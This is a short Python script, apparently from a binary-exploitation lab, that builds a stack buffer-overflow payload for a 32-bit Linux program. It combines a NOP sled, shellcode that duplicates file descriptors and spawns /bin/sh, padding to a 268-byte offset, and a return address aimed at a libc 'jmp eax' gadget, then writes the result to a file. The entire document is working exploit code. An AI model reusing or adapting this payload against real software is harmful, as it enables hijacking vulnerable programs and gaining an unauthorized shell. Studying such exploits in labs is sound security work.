#!/usr/bin/python3

# libc base address 0xf7c00000 & jmp eax offset in /usr/lib/i386-linux-gnu/libc.so.6 0x000218e7
# fc7c0000 + 218e7 = f7c218e7


nopsled = b"\x90" * 60

shellcode = b"\x31\xdb\xb3\x03\x31\xc9\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\x80\xf9\xff\x75\xf3\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

padding_length = 268 - 60 - len(shellcode)

padding = b"A" * padding_length

# eip is at +268 from esp, we input in it the address of jmpeax instruction:
eip = b"\xe7\x18\xc2\xf7"

junk = b"C" * 28

payload = nopsled + shellcode + padding + eip + junk


with open("jmpeax", "wb") as f:
    f.write(payload)
